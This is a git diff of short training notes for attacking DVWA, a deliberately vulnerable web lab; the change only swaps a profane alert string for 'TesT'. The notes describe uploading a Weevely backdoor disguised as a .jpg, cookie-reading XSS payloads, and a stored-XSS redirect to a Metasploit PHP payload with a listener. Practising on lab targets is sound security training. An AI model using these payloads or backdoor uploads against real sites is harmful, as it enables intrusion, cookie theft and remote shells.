@@ -18,11 +18,11 @@ Upload:
 Use Weevely to create a backdoor and rename it back.php.jpg then upload it and connect to it with Weevely.  If it doesn't tell you where it uploads use Burpsuite to spider the site.
 
 XSS reflected (low):
-<script>alert("bitch")</script>
+<script>alert("TesT")</script>
 <script>alert(document.cookie)</script>
 
 XSS stored (low):
-<script>alert("bitch")</script>
+<script>alert("TesT")</script>
 <script>alert(document.cookie)</script>
 http://www.computersecuritystudent.com/SECURITY_TOOLS/DVWA/DVWAv107/lesson9/
 You can upload a metasploit php payload and put it in <script>window.location="http://192.168.1.106/dvwa/hackable/uploads/FORUM_BUG.php" </script> and set up a listener
